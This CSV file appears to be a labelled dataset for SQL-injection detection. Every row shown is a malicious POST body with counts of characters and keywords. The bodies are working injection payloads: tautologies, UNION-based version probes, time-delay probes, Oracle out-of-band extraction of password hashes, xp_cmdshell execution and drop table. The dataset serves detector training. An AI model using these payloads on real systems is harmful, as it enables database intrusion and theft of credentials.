method,body,class,single_q,double_q,dashes,braces,spaces,badwords,path
POST," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,0,0,3,2,29,6,
POST,group by userid having 1  =  1--,1,0,0,3,0,8,3,
POST," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,0,0,3,0,17,5,
POST,select * from users where id  =  1 *1 or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,0,1,3,0,24,5,
POST,‘ or 1  =  1 --,1,0,0,3,0,7,1,
POST," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,0,0,3,0,16,5,
POST,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,0,0,3,2,26,4,
POST,or 'a'  =  'a,1,3,0,0,0,5,1,
POST,declare @s varchar  (  22  )   select @s   = ,1,0,0,0,2,16,1,
POST," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,0,0,3,0,17,5,
POST," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,0,1,3,4,33,6,
POST,@variable,1,0,0,0,0,0,0,
POST, exec master..xp_cmdshell,1,0,0,0,0,2,0,
POST,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,0,0,3,2,26,4,
POST," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,0,0,3,2,24,5,
POST," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,0,0,3,2,24,5,
POST," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,0,0,3,2,30,6,
POST," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,3,0,3,2,29,6,
POST, and 1 in   (  select var from temp  )  --,1,0,0,3,2,15,4,
POST," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,3,2,3,0,23,7,
POST," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,or x  =  x,1,0,0,0,0,5,1,
POST,or a  =  a,1,0,0,0,0,5,1,
POST,or '1'  =  '1,1,3,0,0,0,5,1,
POST," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST,   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,3,0,0,8,46,1,
POST," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,3,0,3,0,17,6,
POST," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,3,0,3,2,24,5,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,4,0,3,2,16,2,
POST,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,3,0,3,2,24,5,
POST," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,0,1,3,4,33,6,
POST,a' or 1  =  1--,1,1,0,3,0,6,1,
POST, )   or   (  a  =  a,1,0,0,0,2,13,1,
POST,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,0,4,0,8,46,1,
POST," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,0,1,3,0,20,5,
POST," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,3,0,3,2,24,5,
POST,-- &password  = ,1,0,0,3,0,4,0,
POST,select * from users where id  =  1 <@. or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,0,2,3,2,28,5,
POST," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,0,0,3,0,17,5,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,3,0,0,10,77,13,
POST, or '1'  =  '1,1,3,0,0,0,6,1,
POST,admin' or 1  =  1,1,1,0,0,0,6,1,
POST," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,0,2,3,0,24,5,
POST," select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,0,0,3,0,16,5,
POST," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," union select * from users where login   =   char  (  114,111,111,116  )  ;",1,0,0,0,2,21,4,
POST," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,0,1,3,2,25,6,
POST, or 1  =  1--,1,0,0,3,0,6,1,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,3,0,0,10,77,13,
POST,pg_sleep  (  __TIME__  )  --,1,0,0,3,2,8,0,
POST,‘ or 3  =  3 --,1,0,0,3,0,7,1,
POST," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,0,0,4,2,24,5,
POST," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST, )   union select * from information_schema.tables,1,0,0,0,1,8,3,
POST," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,0,0,0,5,24,2,
POST, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,3,0,0,8,53,6,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST,""" or """" """,1,0,4,0,0,3,1,
POST,delete,1,0,0,0,0,0,1,
POST,waitfor delay '0:0:__TIME__'--,1,2,0,3,0,2,2,
POST, or 1  =  1 --,1,0,0,3,0,7,1,
POST,1' and non_existant_table   =   '1,1,2,0,0,0,8,1,
POST," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,3,0,3,0,18,5,
POST,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,0,0,0,2,19,1,
POST,x' AND userid IS NULL --,1,1,0,3,0,5,2,
POST," select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,3,0,3,0,22,6,
POST," select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,0,0,4,2,24,5,
POST, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,3,0,0,4,35,4,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,0,0,3,2,27,4,
POST," select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,UNION ALL SELECT,1,0,0,0,0,2,3,
POST," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,0,0,3,0,19,5,
POST," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,25,7,
POST,x' or full_name like '%bob%,1,2,0,0,0,4,2,
POST,x' and members.email is NULL --,1,1,0,3,0,5,2,
POST, or 2 > 1,1,0,0,0,0,4,1,
POST,select * from users where id  =  1.*1 or 1  =  1 -- 1,1,0,0,3,0,17,4,
POST,"""  )   or pg_sleep  (  __TIME__  )  --",1,0,1,3,3,14,1,
POST, ',1,1,0,0,0,1,0,
POST," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,0,0,3,0,19,5,
POST, )   or sleep  (  __TIME__  )    =  ',1,1,0,0,3,17,2,
POST,sleep 50',1,1,0,0,0,1,1,
POST," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,3,0,3,0,25,7,
POST,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,0,0,3,0,19,4,
POST," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,or sleep  (  __TIME__  )    =  ',1,1,0,0,2,13,2,
POST," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,0,1,3,2,25,6,
POST," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,0,0,3,2,25,5,
POST," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,0,0,3,2,24,5,
POST,or 2 > 1,1,0,0,0,0,3,1,
POST, exec   (  'sel' + 'ect us' + 'er'  ) ,1,6,0,0,2,14,0,
POST,anything' OR 'x'  =  'x,1,4,0,0,0,6,1,
POST," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,0,0,3,2,31,7,
POST," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,0,0,3,2,24,5,
POST,&',1,1,0,0,0,0,0,
POST,a' or 3  =  3--,1,1,0,3,0,6,1,
POST," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,3,0,3,0,17,6,
POST," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,24,7,
POST,"admin""or 1  =  1 or """"  =  """,1,0,4,0,0,11,1,
POST,uni/**/on sel/**/ect,1,0,0,0,0,1,0,
POST,""" or """"&""",1,0,4,0,0,2,1,
POST, )    )   waitfor delay '0:0:__TIME__'--,1,2,0,3,2,10,2,
POST," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,1 waitfor delay '0:0:10'--,1,2,0,3,0,3,2,
POST,bfilename,1,0,0,0,0,0,0,
POST,admin'  )   or   (  '1'  =  '1'--,1,5,0,3,2,14,1,
POST,UEf,1,0,0,0,0,0,0,
POST, -- &password  = ,1,0,0,3,0,5,0,
POST,1 or sleep  (  __TIME__  )  #,1,0,0,0,2,10,2,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,3,1,3,0,15,5,
POST," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,3,0,3,4,33,5,
POST,1' and 1  =    (  select count  (  *  )   from tablenames  )  --,1,1,0,3,4,25,4,
POST,or sleep  (  __TIME__  )  #,1,0,0,0,2,9,2,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,3,0,0,10,77,13,
POST," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,0,1,3,0,24,5,
POST,||6,1,0,0,0,0,0,0,
POST,or 1/*,1,0,0,0,0,1,1,
POST," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,0,0,0,12,63,1,
POST,select * from users where id  =  1.%@ or 1  =  1 -- 1,1,0,0,3,0,17,4,
POST," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,0,2,3,0,24,5,
POST," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,0,0,3,2,29,6,
POST," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," or 1  =  1 or """"  =  ",1,0,2,0,0,12,2,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,0,0,3,0,19,5,
POST," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,0,0,3,2,32,7,
POST,or 'whatever' in   (  'whatever'  ) ,1,4,0,0,2,10,2,
POST,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,0,0,0,4,27,1,
POST,select * from users where id  =  '1'   or 1  =  1 -- 1',1,3,0,3,0,19,4,
POST,?,1,0,0,0,0,0,0,
POST, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,3,0,0,8,53,6,
POST," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,3,0,3,2,25,5,
POST,"admin""  )   or   (  ""1""  =  ""1""#",1,0,5,0,2,14,1,
POST," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,2,1,3,2,25,6,
POST," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST, or '' ',1,3,0,0,0,3,1,
POST," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,or 1  =  1,1,0,0,0,0,5,1,
POST, drop table temp --,1,0,0,3,0,4,1,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST,""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,0,1,0,4,20,2,
POST,""" or ""x""  =  ""x",1,0,4,0,0,6,1,
POST,select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,3,0,3,0,17,4,
POST," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,0,0,3,2,25,6,
POST, or 'something' like 'some%',1,4,0,0,0,4,2,
POST, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,4,0,3,6,37,3,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,3,0,3,0,19,5,
POST, exec master..xp_cmdshell 'ping 10.10.1.2'--,1,2,0,3,0,4,0,
POST,admin' or '1'  =  '1'--,1,5,0,3,0,6,1,
POST, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1,4,0,3,6,37,3,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,0,0,3,4,32,5,
POST," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,0,1,3,2,25,6,
POST,""";waitfor delay '0:0:__TIME__'--",1,2,1,3,0,2,1,
POST,x' AND userid IS NULL --,1,1,0,3,0,5,2,
POST,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,3,0,3,0,19,4,
POST," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,0,0,3,0,17,6,
POST," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,’ or ‘1’  =  ’1,1,0,0,0,0,6,1,
POST," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,3,0,3,0,23,7,
POST,admin'or 1  =  1 or ''  =  ',1,4,0,0,0,11,1,
POST," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,3,0,3,2,25,6,
POST," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,0,0,0,5,30,1,
POST,exec  (  @s  ) ,1,0,0,0,2,7,0,
POST," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,0,0,3,0,22,6,
POST, or 1  =  1,1,0,0,0,0,6,1,
POST,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,0,0,3,0,19,4,
POST," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,0,0,3,4,32,5,
POST,x' AND email IS NULL --,1,1,0,3,0,5,2,
POST," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1,3,0,3,2,26,5,
POST, --,1,0,0,3,0,1,0,
POST," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,3,0,3,0,25,7,
POST," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,23,7,
POST," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,23,7,
POST,update,1,0,0,0,0,0,1,
POST, or 1/*,1,0,0,0,0,2,1,
POST," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST,"""   )    )    or pg_sleep  (  __TIME__  )  --",1,0,1,3,4,20,1,
POST,||'6,1,1,0,0,0,0,0,
POST," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1,0,0,3,2,24,5,
POST,or   (  EXISTS  ) ,1,0,0,0,2,8,1,
POST,^',1,1,0,0,0,0,0,
POST,or 'text'   =   n'text',1,4,0,0,0,7,1,
POST," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1,0,0,3,0,17,5,
POST," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,3,0,3,0,16,5,
POST," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1,0,0,3,2,24,5,
POST, or 0  =  0 --,1,0,0,3,0,7,1,
POST," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,0,2,3,0,24,5,
POST," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1,0,2,3,0,24,5,
POST," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1,0,1,3,4,33,6,
POST," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1,2,1,3,2,25,6,
POST,password:*/  =  1--,1,0,0,3,0,4,0,
POST," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1,0,0,3,2,24,5,
POST," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1,3,0,3,2,25,5,
POST," union   (  select NULL,   (  select @@version   )    )    --",1,0,0,3,4,24,3,
POST," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1,0,0,3,0,16,5,
POST," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,0,0,3,2,25,5,
POST," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1,0,0,3,2,29,6,
POST," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1,0,0,3,2,25,5,
POST," select * from users where id  =  1. union select null,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1,3,0,0,4,41,5,
POST,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
